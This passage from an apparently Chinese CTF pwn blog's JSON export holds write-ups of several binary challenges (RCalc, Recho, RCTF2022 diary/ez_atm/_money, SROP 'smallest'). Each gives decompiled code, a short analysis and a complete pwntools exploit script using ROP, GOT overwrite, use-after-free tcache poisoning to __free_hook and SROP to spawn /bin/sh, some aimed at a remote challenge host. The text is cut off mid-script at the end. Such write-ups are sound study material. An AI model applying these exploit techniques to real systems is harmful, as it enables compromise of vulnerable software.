__int64 v1; // rsi  __int64 v2; // rdx  unsigned int ptr; // [rsp+Ch] [rbp-24h] BYREF  __int64 v5; // [rsp+10h] [rbp-20h]  FILE *stream; // [rsp+18h] [rbp-18h]  if ( *qword_6020F0 )  &#123;    ptr = *(*(qword_6020F0 + 8) + 8LL * *qword_6020F0 - 8);  &#125;  else  &#123;    stream = fopen(&quot;/dev/urandom&quot;, &quot;r&quot;);    fread(&amp;ptr, 1uLL, 4uLL, stream);    fclose(stream);  &#125;  srand(ptr);  v5 = rand();  v0 = v5 &lt;&lt; 32;  v5 = v0 | rand();  v1 = *(qword_6020F0 + 8);  v2 = (*qword_6020F0)++;  *(v1 + 8 * v2) = v5;  return v5;&#125;\n\n首先是这个，可以看到是将随机值放到chunk里面然后放到栈里面\n__int64 sub_400B92()&#123;  return *(*(qword_6020F0 + 8) + 8LL * (*qword_6020F0)-- - 8);&#125;\n\n通过这个拿到canary的值然后比较，自主实现的一个canary。\n我们再看在计算内部函数如果保存结果的话是保存在哪的\n__int64 __fastcall sub_400E39(__int64 a1)&#123;  __int64 v1; // rsi  __int64 v2; // rdx  __int64 result; // rax  v1 = *(qword_6020F8 + 8);  v2 = (*qword_6020F8)++;  result = a1;  *(v1 + 8 * v2) = a1;  return result;&#125;\n\n可以看到也是保存在chunk里面的，现在画个图基本就可以看出来了\n\n上面储存canary的值*(qword_6020F0 + 8)是放在这样一个chunk里面也就是最下面0x300的chunk里面的\n储存计算结果的值是放在*(qword_6020F8 + 8)这个chunk里面也就是0x100\n并且程序没有检测堆溢出，所以我们可以通过堆溢出覆盖掉下面存的canary然后就直接构造ROPgadget\n(需要注意的是不能使用puts_plt和puts_got，存在0x20会出现截断)\nexpfrom pwn import *from LibcSearcher import *elf = ELF(&#x27;./RCalc&#x27;)libc = ELF(&#x27;./libc.so.6&#x27;)# r = process(&#x27;./RCalc&#x27;)r = remote(&#x27;111.200.241.244&#x27;, 60200)# context.terminal = [&#x27;gnome-terminal&#x27;, &#x27;-x&#x27;, &#x27;sh&#x27;, &#x27;-c&#x27;]# context.log_level = &#x27;debug&#x27;pop_rdi = 0x0000000000401123printf_plt = elf.plt[&#x27;printf&#x27;]__libc_start_main_got = elf.got[&#x27;__libc_start_main&#x27;]ret_addr = 0x00000000004007femain_addr = 0x401036r.recvuntil(b&#x27;Input your name pls: &#x27;)payload = b&#x27;a&#x27;*(0x110-0x8)+p64(0)+p64(0) + \\    p64(pop_rdi)+p64(__libc_start_main_got)+p64(printf_plt)+p64(main_addr)r.sendline(payload)def add(one, two):    r.recvuntil(b&#x27;Your choice:&#x27;)    r.sendline(b&#x27;1&#x27;)    r.recvuntil(b&#x27;input 2 integer: &#x27;)    r.sendline(bytes(str(one), encoding=&#x27;utf8&#x27;))    r.sendline(bytes(str(two), encoding=&#x27;utf8&#x27;))    r.recvuntil(b&#x27;Save the result?&#x27;)    r.sendline(b&#x27;yes&#x27;)for i in range(int(0x100/0x8)+3):    add(0, 0)# gdb.attach(r)r.recvuntil(b&#x27;Your choice:&#x27;)r.sendline(b&#x27;5&#x27;)__libc_start_main_addr = u64(r.recv(6).ljust(8, b&#x27;\\x00&#x27;))libc = LibcSearcher(&#x27;__libc_start_main&#x27;, __libc_start_main_addr)libc_base = __libc_start_main_addr-libc.dump(&#x27;__libc_start_main&#x27;)system_addr = libc_base+libc.dump(&#x27;system&#x27;)bin_sh_addr = libc_base+libc.dump(&#x27;str_bin_sh&#x27;)print(bin_sh_addr)print(system_addr)r.recvuntil(b&#x27;Input your name pls: &#x27;)payload = b&#x27;a&#x27;*(0x110-0x8)+p64(0)+p64(0)+p64(pop_rdi) + \\    p64(bin_sh_addr)+p64(system_addr)r.sendline(payload)for i in range(int(0x100/0x8)+3):    add(0, 0)r.recvuntil(b&#x27;Your choice:&#x27;)# gdb.attach(r)r.sendline(b&#x27;5&#x27;)r.interactive()\n\n","categories":["pwn-xctf"],"tags":["栈溢出"]},{"title":"Recho","url":"/2021/10/19/Recho/","content":"检查保护与分析\n64位只开了栈不可执行\n分析流程int __cdecl main(int argc, const char **argv, const char **envp)&#123;  char nptr[16]; // [rsp+0h] [rbp-40h] BYREF  char buf[40]; // [rsp+10h] [rbp-30h] BYREF  int v6; // [rsp+38h] [rbp-8h]  int v7; // [rsp+3Ch] [rbp-4h]  Init(argc, argv, envp);  write(1, &quot;Welcome to Recho server!\\n&quot;, 0x19uLL);  while ( read(0, nptr, 0x10uLL) &gt; 0 )  &#123;    v7 = atoi(nptr);    if ( v7 &lt;= 15 )      v7 = 16;    v6 = read(0, buf, v7);    buf[v6] = 0;    printf(&quot;%s&quot;, buf);  &#125;  return 0;&#125;\n\nunsigned int Init()&#123;  setvbuf(stdin, 0LL, 2, 0LL);  setvbuf(_bss_start, 0LL, 2, 0LL);  setvbuf(stderr, 0LL, 2, 0LL);  return alarm(0x3Cu);&#125;\n\n可以看到程序是让我们先写入0x10个字节然后把这个指针的值转化成int类型，然后在给buf写值，所以在while循环里面的read是可以进行栈溢出。\n但是只有当return但是输入0字节不得行，但是pwntools里面的shutdown函数可以解决，但是shutdown之后就会断开连接了，所以就要把所有东西搞到栈上。\n看了wp之后发现在data段有flag这个字符串，既然没法持续连接的话就只能直接输出flag，加之flag字符串有现成的所以可以读取文件然后输出就行，open()-&gt;read()-&gt;printf()这样一个流程。\n利用过程根据上面的流程，read和printf都有直接调用就行但是open没有，所以需要构造出open函数，但是函数是在shutdown之后就结束所以想爆出libc的位置是不可能了，只有篡改got表。\n\nalarm函数的内部的第三条语句就是syscall也就是系统调用，在linux的系统调用表里面alarm也就是0x25\n\n上面还有open\n是2就可以调用到open所以可以开始构造了，众所周知64位程序的函数参数少于七个的时候是在rdi, rsi, rdx, rcx, r8, r9上，直接开始构造ROP\n\n\npayload = b&#x27;a&#x27;*0x38# 这里就是篡改got表的地址，让got表直接指向syscall    我本地gdb调出来可以看到是0x9的偏移量，但是解题需要0x5主要是因为libc版本不一样payload += p64(pop_rax_addr)+p64(0x5)+p64(pop_rdi_addr) + \\    p64(alarm_got_addr)+p64(add_rdi_al_addr)# 这一步执行opne(&#x27;flag&#x27;,0)payload += p64(pop_rdi_addr)+p64(flag_addr)+p64(pop_rsi_r15_addr) + \\    p64(0)+p64(0)+p64(pop_rax_addr)+p64(0x2)+p64(alarm_plt_addr)# 这一步执行read(fb,stdin,0x30)payload += p64(pop_rdi_addr)+p64(0x3)+p64(pop_rsi_r15_addr) + \\ # 这里open的文件描述符一般从3开始    p64(stdin_addr)+p64(0)+p64(pop_rdx_addr)+p64(0x30)+p64(read_addr)# 这里调用printf(stdin)payload += p64(pop_rdi_addr)+p64(stdin_addr)+p64(printf_addr)\n\n\n\nexpfrom pwn import *context(os=&#x27;linux&#x27;, arch=&#x27;amd64&#x27;, log_level=&#x27;debug&#x27;)elf = ELF(&#x27;./questions/773a2d87b17749b595ffb937b4d29936&#x27;)r = remote(&#x27;111.200.241.244&#x27;, 61160)r.recvuntil(b&#x27;Welcome to Recho server!&#x27;)r.sendline(str(0x200))pop_rax_addr = 0x00000000004006fcpop_rdi_addr = 0x00000000004008a3pop_rsi_r15_addr = 0x00000000004008a1pop_rdx_addr = 0x00000000004006feadd_rdi_al_addr = 0x000000000040070dprintf_addr = elf.plt[&#x27;printf&#x27;]read_addr = elf.plt[&#x27;read&#x27;]flag_addr = elf.symbols[&#x27;flag&#x27;]alarm_plt_addr = elf.plt[&#x27;alarm&#x27;]alarm_got_addr = elf.got[&#x27;alarm&#x27;]stdin_addr = elf.symbols[&#x27;stdin&#x27;]payload = b&#x27;a&#x27;*(0x30+0x8) + p64(pop_rax_addr)+p64(0x5)+p64(pop_rdi_addr) + \\    p64(alarm_got_addr)+p64(add_rdi_al_addr)payload += p64(pop_rdi_addr)+p64(flag_addr)+p64(pop_rsi_r15_addr) + \\    p64(0)+p64(0)+p64(pop_rax_addr)+p64(0x2)+p64(alarm_plt_addr)payload += p64(pop_rdi_addr)+p64(0x3)+p64(pop_rsi_r15_addr) + \\    p64(stdin_addr)+p64(0)+p64(pop_rdx_addr)+p64(0x30)+p64(read_addr)payload += p64(pop_rdi_addr)+p64(stdin_addr)+p64(printf_addr)r.sendline(payload)r.shutdown(&#x27;send&#x27;)r.interactive()\n\n","categories":["pwn-xctf"],"tags":["stack-overflow","ROP","GOP表篡改"]},{"title":"RCTF2022复现","url":"/2023/04/22/RCTF2022%E5%A4%8D%E7%8E%B0/","content":"diary利用分析就是一道很正常的用户态堆题。在delete函数中存在UAF漏洞。\n不过题目的逆向过程比较麻烦，加之我开始没注意到题目已经给了输入command的格式，如果注意到的话动态调试来逆向更为简单。\n题目很简单，利用UAF使得tcache和unsorted bin中同时存在一个chunk，泄漏出libc地址。利用encrypt函数分配到unsorted bin中的chunk进而修改到tcache中chunk的fd指针指向__free_hook即可。\nexpfrom pwn import *elf = ELF(&#x27;./pwn&#x27;)r = process(&#x27;./pwn&#x27;)libc = ELF(&#x27;./libc.so.6&#x27;)context.log_level = &#x27;debug&#x27;context.terminal = [&#x27;tmux&#x27;, &#x27;splitw&#x27;, &#x27;-h&#x27;]context.arch = &#x27;amd64&#x27;def create(idx, content):    r.recvuntil(b&#x27;input your test cmd:&#x27;)    payload = &#x27;add#1#1#1#1#1#&#123;&#125;#&#123;&#125;&#x27;.format(str(idx), content)    payload = bytes(payload, encoding=&#x27;utf8&#x27;)    r.sendline(payload)def update(idx, content):    r.recvuntil(b&#x27;input your test cmd:&#x27;)    payload = &#x27;update#&#123;&#125;#&#123;&#125;&#x27;.format(str(idx), content)    payload = bytes(payload, encoding=&#x27;utf8&#x27;)    r.sendline(payload)def show(idx):    r.recvuntil(b&#x27;input your test cmd:&#x27;)    payload = &#x27;show#&#123;&#125;&#x27;.format(str(idx))    payload = bytes(payload, encoding=&#x27;utf8&#x27;)    r.sendline(payload)def delete(idx):    r.recvuntil(b&#x27;input your test cmd:&#x27;)    payload = &#x27;delete#&#123;&#125;&#x27;.format(str(idx))    payload = bytes(payload, encoding=&#x27;utf8&#x27;)    r.sendline(payload)def encrypt(idx, offset, length):    r.recvuntil(b&#x27;input your test cmd:&#x27;)    payload = &#x27;encrypt#&#123;&#125;#&#123;&#125;#&#123;&#125;&#x27;.format(str(idx), str(offset), str(length))    payload = bytes(payload, encoding=&#x27;utf8&#x27;)    r.sendline(payload)for i in range(11):    create(i, str(i))for i in range(6):    delete(10-i)delete(1)show(3)r.recvuntil(b&#x27;1.1.1 1:1:4\\n&#x27;)heap_base = u64(r.recv(6).ljust(8, b&#x27;\\x00&#x27;)) - 0x13a30print(&quot;heap_base:&quot;, hex(heap_base))update(3, b&#x27;3&#x27;)delete(1)show(2)r.recvuntil(b&#x27;1.1.1 1:1:4\\n&#x27;)libc_base = u64(r.recv(6).ljust(8, b&#x27;\\x00&#x27;)) - 0x1ecbe0print(&quot;libc_base:&quot;, hex(libc_base))free_hook = libc_base+0x1eee48system_addr = libc_base + libc.symbols[&#x27;system&#x27;]bin_sh_addr = libc_base + next(libc.search(b&#x27;/bin/sh&#x27;))r.recvuntil(b&#x27;input your test cmd:&#x27;)payload = b&#x27;update#0#&#x27; + flat(free_hook-4)r.sendline(payload)encrypt(0, 4, 6)update(0, &#x27;A&#x27;*(0x2c0-0x16))create(40, &#x27;/bin/sh;&#x27;)r.recvuntil(b&#x27;input your test cmd:&#x27;)payload = b&#x27;add#1#1#1#1#1#41#&#x27;+flat(system_addr)r.sendline(payload)delete(4)delete(3)# gdb.attach(r)r.interactive()\n\n这道题我在下面这个位置这里破防了，一直无法double free我还以为是glibc中检查了又不报错，去翻了源码发现会有报错，这才看了题目这里居然有这样一个验证属于是有点儿恶心人了。\n_BOOL8 __fastcall sub_43CC(__int64 a1)&#123;  return memcmp(*(const void **)(a1 + 0x10), &quot;    &quot;, 4uLL) == 0;&#125;void __fastcall sub_4194(__int64 a1)&#123;  if ( *(_QWORD *)(a1 + 0x10) &amp;&amp; (unsigned __int8)sub_43CC(a1) )  &#123;    if ( *(_QWORD *)(a1 + 0x10) )      operator delete[](*(void **)(a1 + 0x10));  &#125;&#125;\n\nez_atm利用分析题目难度依旧不是很大，但是我没想明白的是，一开始我可以gdb去调试服务端程序，但是后面却一直卡在accept了，有大佬知道的话可以留言告诉我一下怎么回事。也正是因为这道题目比较简单才可以在不调试的情况下直接打。\n这道题逆向分析过程也不算很难，存在三处漏洞。\n__int64 __fastcall stat_query(__int64 a1)&#123;  reply_message(1, a1);  return 1LL;&#125;\n\n这个函数中返回的依旧是0x84个字节，所以就可以读取到返回地址也就是libc上的地址了，从而拿到libc地址。\n__int64 query()&#123;  reply_message(1, user_list[user_id]);  return 2LL;&#125;\n\n第二处跟第一处类似，不同的是这里是越界读取堆上的内容，那么可以泄漏出堆地址。\n__int64 cancellation()&#123;  int i; // [rsp+Ch] [rbp-4h]  for ( i = 5; i &gt; 0; --i )  &#123;    if ( check_passwrod(user_id, &amp;password) )    &#123;      free((void *)user_list[user_id]);      user_id = -1;      reply_message(1, (__int64)&quot;The target account has been cancelled.&quot;);      return 0LL;    &#125;    if ( i != 1 )      reply_message(2, (__int64)&quot;password error.Try again.&quot;);    get_message();  &#125;  reply_message(    0,    (__int64)&quot;The password has been entered incorrectly for more than 5 times, and your account has been frozen.&quot;);  *(_DWORD *)(user_list[user_id] + 0x2CLL) = 1;  return 0LL;&#125;\n\n第三处则是这里在free之后没有清空指针引起的UAF。\n所以利用思路就是先泄漏libc地址，再泄漏heap地址，最后利用UAF篡改tcache中chunk的fd到__free_hook即可。\nexpfrom pwn import *from ctypes import cdllelf = ELF(&#x27;./pwn&#x27;)r = remote(&#x27;0.0.0.0&#x27;, 3339)# r = process(&#x27;./pwn&#x27;)libc = ELF(&#x27;./libc.so.6&#x27;)context.log_level = &#x27;debug&#x27;context.terminal = [&#x27;tmux&#x27;, &#x27;splitw&#x27;, &#x27;-h&#x27;]context.arch = &#x27;amd64&#x27;def get_random(random):    if random &lt;= 9:        return 0x30+random    if random == 10:        return 0x61    if random == 11:        return 0x62    if random == 12:        return 0x63    if random == 13:        return 0x64    if random == 14:        return 0x65    return 0x30seed = u32(r.recv(4))print(hex(seed))objdll = cdll.LoadLibrary(&#x27;./libc.so.6&#x27;)objdll.srand(seed)uuid = &#x27;yxyxyx-xyyx-4xyx4-xyyx-xyyyyxy&#x27;uuid = list(uuid)for i in range(0x1d + 1):    if ord(uuid[i]) != 52 and ord(uuid[i]) != 45:        if ord(uuid[i]) == 0x78:            random_num = objdll.rand() % 15            uuid[i] = chr(get_random(random_num))        else:            random_num = objdll.rand() % 15            uuid[i] = chr(get_random(random_num &amp; 3 | 8))uuid = &#x27;&#x27;.join(uuid)print(uuid)r.send(uuid)r.recv(0x84)def query():    sleep(0.1)    r.sendline(b&#x27;query&#x27;)def new_account(account, password, money):    sleep(0.1)    payload = b&#x27;&#x27;    payload += b&#x27;new_account&#x27;.ljust(0x10, b&#x27;\\x00&#x27;)    payload += password.ljust(0x8, b&#x27;\\x00&#x27;)    payload += account.ljust(0x20, b&#x27;\\x00&#x27;)    payload += bytes(str(money), encoding=&#x27;utf8&#x27;).ljust(0x4, b&#x27;\\x00&#x27;)    r.sendline(payload)    r.recv(0x84)def cancellation(password):    sleep(0.1)    payload = b&#x27;&#x27;    payload += b&#x27;cancellation&#x27;.ljust(0x10, b&#x27;\\x00&#x27;)    payload += password.ljust(0x8, b&#x27;\\x00&#x27;)    r.sendline(payload)    r.recv(0x84)def login(account, password):    sleep(0.1)    payload = b&#x27;&#x27;    payload += b&#x27;login&#x27;.ljust(0x10, b&#x27;\\x00&#x27;)    payload += password.ljust(0x8, b&#x27;\\x00&#x27;)    payload += account.ljust(0x20, b&#x27;\\x00&#x27;)    r.sendline(payload)    r.recv(0x84)def update_pwd(old_password, new_password):    sleep(0.1)    payload = b&#x27;update_pwd&#x27;.ljust(0x10, b&#x27;\\x00&#x27;)    payload += new_password.ljust(8, b&#x27;\\x00&#x27;)    r.sendline(payload)    r.recvuntil(b&#x27;please input your pasword.&#x27;)    r.recv(0x84 - len(&#x27;please input your pasword.&#x27;))    payload = b&#x27;\\x00&#x27;*0x10    payload += old_password.ljust(8, b&#x27;\\x00&#x27;)    r.sendline(payload)    r.recv(0x84)new_account(b&#x27;dzhsb&#x27;, b&#x27;wow&#x27;, 0x100)sleep(0.1)r.sendline(b&#x27;exit_account&#x27;)new_account(b&#x27;dzz&#x27;, b&#x27;zzz&#x27;, 0x100)sleep(0.1)r.sendline(b&#x27;exit_account&#x27;)new_account(b&#x27;a&#x27;, b&#x27;a&#x27;, 0x100)sleep(0.1)r.sendline(b&#x27;stat_query&#x27;)r.recv(0x4+0x18)libc_base = u64(r.recv(8)) - 0x21c87print(hex(libc_base))r.recv(0x84 - 0x24)cancellation(b&#x27;a&#x27;)login(b&#x27;dzz&#x27;, b&#x27;zzz&#x27;)cancellation(b&#x27;zzz&#x27;)login(b&#x27;dzhsb&#x27;, b&#x27;wow&#x27;)query()r.recv(0x40 + 4)heap_addr = u64(r.recv(8))tcache_addr = u64(r.recv(8))print(hex(heap_addr))print(hex(tcache_addr))free_hook = libc_base + 0x3ed8e8system_addr = libc_base + libc.symbols[&#x27;system&#x27;]sleep(0.1)r.sendline(b&#x27;exit_account&#x27;)login(flat(tcache_addr), flat(heap_addr))update_pwd(flat(heap_addr), flat(free_hook))sleep(0.1)r.sendline(b&#x27;exit_account&#x27;)new_account(b&#x27;&gt;&amp;4&#x27;, b&#x27;cat flag&#x27;, 0x100)sleep(0.1)r.sendline(b&#x27;exit_account&#x27;)new_account(b&#x27;196082&#x27;, flat(system_addr), 0x100)sleep(0.1)r.sendline(b&#x27;exit_account&#x27;)login(b&#x27;&gt;&amp;4&#x27;, b&#x27;cat flag&#x27;)cancellation(b&#x27;cat flag&#x27;)r.interactive()\n\n因为这是cs架构的缘故，没有直接与程序进行交互，所以无法使用system(&quot;/bin/sh&quot;);。考虑使用反弹shell但是需要长度过长了，最后只能用这种重定向的方法传递flag。\n_money利用分析这道题目的逆向部分和上面题目很类似，细心的话可以很快发现。\n__int64 loan()&#123;  __m128i *v0; // rax  __int64 chunk; // rdx  int v2; // ecx  _DWORD *v3; // rax  if ( loan_idx &gt; 10 )  &#123;    my_puts(&quot;The loan has reached the upper limit of the system.&quot;);    return 2LL;  &#125;  else if ( *(_DWORD *)(user_list[uid] + 0x34LL) )  &#123;    my_puts(&quot;You still have a loan that has not been paid off, so you cannot continue to borrow.&quot;);    return 2LL;  &#125;  else  &#123;    my_puts(&quot;Please enter the loan amount (no more than 1 million).&quot;);    money = input_l();    if ( (unsigned int)money &gt; 0xF4240 )    &#123;      my_puts(&quot;Don&#x27;t push your luck.&quot;);    &#125;    else    &#123;      my_puts(&quot;Please leave your comments.&quot;);      my_read((char *)(loan_money + 72LL * loan_idx + 0x20), 0x20);      v0 = (__m128i *)(loan_money + 72LL * loan_idx);      chunk = user_list[uid];      *v0 = _mm_loadu_si128((const __m128i *)(chunk + 8));      v0[1] = _mm_loadu_si128((const __m128i *)(chunk + 0x18));      LODWORD(chunk) = loan_idx;      v2 = money;      *(_QWORD *)(loan_money + 72LL * loan_idx + 0x40) = (unsigned int)money;      v3 = (_DWORD *)user_list[uid];      v3[10] += v2;      v3[12] += v2;      v3[14] = chunk;      v3[13] = 1;      loan_idx = chunk + 1;      my_puts(&quot;The application has been submitted. Please check it.&quot;);    &#125;    return 2LL;  &#125;&#125;\n\n这个函数中的因为对loan_idx检查不正确导致越界读写。利用思路就是通过越界写修改size，使原本chunk的size变为0x460，释放后进入unsorted bin通过越界读读取libc地址。再通过同样的办法使第一个chunk进入到tcache中去，泄漏出堆地址。最后有两个指针指向同一个地址，理所当然修改tcache中chunk的fd指针即可。\nexpfrom pwn import *elf = ELF(&#x27;./pwn&#x27;)r = process(&#x27;./pwn&#x27;)libc = ELF(&#x27;./libc.so.6&#x27;)context.log_level = &#x27;debug&#x27;context.terminal = [&#x27;tmux&#x27;, &#x27;splitw&#x27;, &#x27;-h&#x27;]context.arch = &#x27;amd64&#x27;def query():    r.recvuntil(b&#x27;your choice :     &#x27;)    r.sendline(b&#x27;Query&#x27;)def new_account(account, password, money):    r.recvuntil(b&#x27;your choice :     &#x27;)    r.sendline(b&#x27;new_account&#x27;)    r.recvuntil(b&#x27;please input the account id&#x27;)    r.sendline(account)    r.recvuntil(b&#x27;please input the password&#x27;)    r.sendline(password)    r.recvuntil(b&#x27;please input the money&#x27;)    r.sendline(bytes(str(money), encoding=&#x27;utf8&#x27;))def delete_account(password):    r.recvuntil(b&#x27;your choice :     &#x27;)    r.sendline(b&#x27;Cancellation&#x27;)    r.recvuntil(b&#x27;please enter the password&#x27;)    r.sendline(password)def update_info(new_password, old_password):    r.recvuntil(b&#x27;your choice :     &#x27;)    r.sendline(b&#x27;Update_info&#x27;)    r.recvuntil(b&#x27;please entet  a new password&#x27;)    r.sendline(new_password)    r.recvuntil(b&#x27;please input your password.&#x27;)    r.sendline(old_password)def loan_money(amount, comments):    r.recvuntil(b&#x27;your choice :     &#x27;)    r.sendline(b&#x27;Loan_money&#x27;)    r.recvuntil(b&#x27;Please enter the loan amount (no more than 1 million).&#x27;)    r.sendline(bytes(str(amount), encoding=&#x27;utf8&#x27;))    r.recvuntil(b&#x27;Please leave your comments.&#x27;)    r.sendline(comments)def repayment(amount):    r.recvuntil(b&#x27;your choice :     &#x27;)    r.sendline(b&#x27;Repayment&#x27;)    r.recvuntil(b&#x27;How much do you want to repay?&#x27;)    r.sendline(bytes(str(amount), encoding=&#x27;utf8&#x27;))def show_all_loan():    r.recvuntil(b&#x27;your choice :     &#x27;)    r.sendline(b&quot;I&#x27;m vip!&quot;)def exit_account():    r.recvuntil(b&#x27;your choice :     &#x27;)    r.sendline(b&#x27;Exit_account&#x27;)def login(account, password):    r.recvuntil(b&#x27;your choice :     &#x27;)    r.sendline(b&#x27;login&#x27;)    r.recvuntil(b&#x27;please input the account id&#x27;)    r.sendline(account)    r.recvuntil(b&#x27;please input the password&#x27;)    r.sendline(password)for i in range(10):    new_account(bytes(chr(0x61 + i), encoding=&#x27;utf8&#x27;)*0x20,                bytes(chr(0x31 + i), encoding=&#x27;utf8&#x27;), 0x100)    exit_account()for i in range(10):    login(bytes(chr(0x61 + i), encoding=&#x27;utf8&#x27;)*0x20,          bytes(chr(0x31 + i), encoding=&#x27;utf8&#x27;))    loan_money(0x100, b&#x27;dzhsb&#x27;)    exit_account()new_account(flat(0, 0x461, [0]*2),            bytes(chr(0x31 + 10), encoding=&#x27;utf8&#x27;), 0x100)exit_account()for i in range(4):    new_account(bytes(chr(0x61 + i + 11), encoding=&#x27;utf8&#x27;)*0x20,                bytes(chr(0x31 + i + 11), encoding=&#x27;utf8&#x27;), 0xffffffff)    exit_account()login(flat(0, 0x461, [0]*2), bytes(chr(0x31 + 10), encoding=&#x27;utf8&#x27;))loan_money(0x100, b&#x27;dzhsb&#x27;)exit_account()login(flat(0, b&#x27;dzhsb\\x00&#x27;, b&#x27;a&#x27;*0x12), flat([0]))delete_account(flat(0))login(b&#x27;o&#x27;*0x20, b&#x27;?&#x27;)show_all_loan()r.recvuntil(b&#x27;jjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjj&#x27;)r.recvuntil(b&#x27;Loan account  :&#x27;)r.recv(0x10)libc_base = u64(r.recv(8)) - 0x1ecbe0print(hex(libc_base))system_addr = libc_base + libc.symbols[&#x27;system&#x27;]free_hook = libc_base + 0x1eee48exit_account()new_account(b&#x27;elephant&#x27;.ljust(0x20, b&#x27;\\x00&#x27;), b&#x27;/bin/sh\\x00&#x27;, 0x100)exit_account()new_account(b&#x27;196082&#x27;+b&#x27;\\x00&#x27;*(0x20-0x6), b&#x27;X&#x27;+b&#x27;\\x00&#x27;*0x7, 0x100)exit_account()new_account(b&#x27;fuck_man&#x27;+b&#x27;\\x00&#x27;*(0x20-0x8), b&#x27;SB&#x27;+b&#x27;\\x00&#x27;*0x6, 0x100)exit_account()login(b&#x27;196082&#x27;+b&#x27;\\x00&#x27;*(0x20-0x6), b&#x27;X&#x27;+b&#x27;\\x00&#x27;*0x7)delete_account(b&#x27;X&#x27;+b&#x27;\\x00&#x27;*0x7)login(b&#x27;elephant&#x27;.ljust(0x20, b&#x27;\\x00&#x27;), b&#x27;/bin/sh\\x00&#x27;)delete_account(b&#x27;/bin/sh\\x00&#x27;)login(b&#x27;n&#x27;*0x20, b&#x27;&gt;&#x27;.ljust(8, b&#x27;\\x00&#x27;))show_all_loan()r.recvuntil(b&#x27;jjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjj&#x27;)r.recvuntil(b&#x27;Loan account  :&#x27;)r.recv(0x10)heap_base = u64(r.recv(8)) - 0x5d0print(hex(heap_base))exit_account()new_account(b&#x27;elephant&#x27;.ljust(0x20, b&#x27;\\x00&#x27;), b&#x27;/bin/sh\\x00&#x27;, 0x100)exit_account()new_account(b&#x27;196082&#x27;+b&#x27;\\x00&#x27;*(0x20-0x6), b&#x27;X&#x27;+b&#x27;\\x00&#x27;*0x7, 0x100)exit_account()login(b&#x27;fuck_man&#x27;+b&#x27;\\x00&#x27;*(0x20-0x8), b&#x27;SB&#x27;+b&#x27;\\x00&#x27;*0x6)delete_account(b&#x27;SB&#x27;+b&#x27;\\x00&#x27;*0x6)login(b&#x27;196082&#x27;+b&#x27;\\x00&#x27;*(0x20-0x6), b&#x27;X&#x27;+b&#x27;\\x00&#x27;*0x7)delete_account(b&#x27;X&#x27;+b&#x27;\\x00&#x27;*0x7)password = heap_base + 0x620account = heap_base + 0x10login(flat(account).ljust(0x20, b&#x27;\\x00&#x27;), flat(password))update_info(flat(free_hook, [0]*4), flat(password))exit_account()new_account(b&#x27;fuck_man&#x27;+b&#x27;\\x00&#x27;*(0x20-0x8), b&#x27;SB&#x27;+b&#x27;\\x00&#x27;*0x6, 0x100)exit_account()new_account(b&#x27;\\x00&#x27;*0x20, flat(system_addr), 0x0)exit_account()login(b&#x27;elephant&#x27;.ljust(0x20, b&#x27;\\x00&#x27;), b&#x27;/bin/sh\\x00&#x27;)delete_account(b&#x27;/bin/sh\\x00&#x27;)# gdb.attach(r, &#x27;b*$rebase(0x187C)&#x27;)r.interactive()\n\n","categories":["比赛复现"],"tags":["UAF"]},{"title":"SROP","url":"/2022/03/01/SROP/","content":"在做题之前一直认为SROP是一项比较难以理解的东西，做了之后发现并不是那么回事，原理的话我推荐这个博主，我这里就不在赘述了。\n题目:2016年-360春秋杯-srop赛题smallest        buu上面也有\n题目就是裸奔，除了堆栈不可执行都没开\n题目的代码也很简单，就在start存在\n\n我对于这个东西的理解：在调用sys_rt_sigreturn时，会将rsp所指向的位置当作sigFrame，以至于我们可以随便伪造sigFrame\n在实行SROP攻击的时候需要知道的几个条件：需要泄漏出一个栈地址，需要知道syscall的地址，需要控制rax\n利用过程r.send(p64(start_addr)*3)r.send(b&#x27;\\xb3&#x27;)r.recv(0x8)stack_addr = u64(r.recv(8))print(hex(stack_addr))\n\n首先泄漏栈地址，从上图可以看到start_addr=0x4000b0，我们首先写入三个start的地址到栈里面，然后进行下一个read，我们输入b’\\xb3’，那么这时候我们将我们写入的第二个start地址改成了0x4000b3，并且此时的rax为1，所以下一次就会输出0x400个栈上面的内容，借机泄漏栈地址。\nsigframe = SigreturnFrame()sigframe.rax = constants.SYS_readsigframe.rdi = 0sigframe.rsi = stack_addrsigframe.rdx = 0x400sigframe.rsp = stack_addrsigframe.rip = syscall_addrpayload = p64(start_addr)+b&#x27;a&#x27;*0x8+bytes(sigframe)r.send(payload)payload = p64(syscall_addr).ljust(0xf, b&#x27;b&#x27;)r.send(payload)\n\n在第三个read的时候我们写入start的地址和伪造的sigframe，接着进入第四次read，随后写入syscall地址，然后补齐0xf个字节，然后就会执行sys_rt_sigreturn，并且此时的rsp正好指向了我们伪造的sigframe。\nbin_sh_addr = stack_addr+0x120sigframe = SigreturnFrame()sigframe.rax = constants.SYS_execvesigframe.rdi = bin_sh_addrsigframe.rsi = 0sigframe.rdx = 0sigframe.rsp = stack_addrsigframe.rip = syscall_addrpayload = p64(start_addr)+b&#x27;a&#x27;*0x8+bytes(sigframe)print(hex(len(payload)))payload = payload.ljust(0x120, b&#x27;\\x00&#x27;)+b&#x27;/bin/sh\\x00&#x27;r.send(payload)payload = p64(syscall_addr).ljust(0xf, b&#x27;\\x00&#x27;)r.send(payload)\n\n此时，在执行完之后就会进入第五次read，此次read是我们构造的，所以rsi在我们已知的栈地址上面写入内容，所以使用同样的方法构造出execve。\n综上得出expfrom pwn import *elf = ELF(&#x27;./smallest&#x27;)r = process(&#x27;./smallest&#x27;)context.log_level = &#x27;debug&#x27;context.terminal = [&#x27;gnome-terminal&#x27;, &#x27;-x&#x27;, &#x27;sh&#x27;, &#x27;-c&#x27;]context.arch = &#x27;amd64&#x27;start_addr = 0x4000B0syscall_addr = 0x4000BEr.send(p64(start_addr)*3)r.send(b&#x27;\\xb3&#x27;)r.recv(0x8)stack_addr = u64(r.recv(8))print(hex(stack_addr))sigframe = SigreturnFrame()sigframe.rax = constants.SYS_readsigframe.rdi = 0sigframe.rsi = stack_addrsigframe.rdx = 0x400sigframe.rsp = stack_addrsigframe.rip = syscall_addrpayload = p64(start_addr)+b&#x27;a&#x27;*0x8+bytes(sigframe)r.send(payload)payload = p64(syscall_addr).ljust(0xf, b&#x27;b&#x27;)r.send(payload)bin_sh_addr = stack_addr+0x120sigframe = SigreturnFrame()sigframe.rax = constants.SYS_execvesigframe.rdi = bin_sh_addrsigframe.rsi = 0sigframe.rdx = 0sigframe.rsp = stack_addrsigframe.rip = syscall_addrpayload = p64(start_addr)+b&#x27;a&#x27;*0x8+bytes(sigframe)print(hex(len(payload)))payload = payload.ljust(0x120, 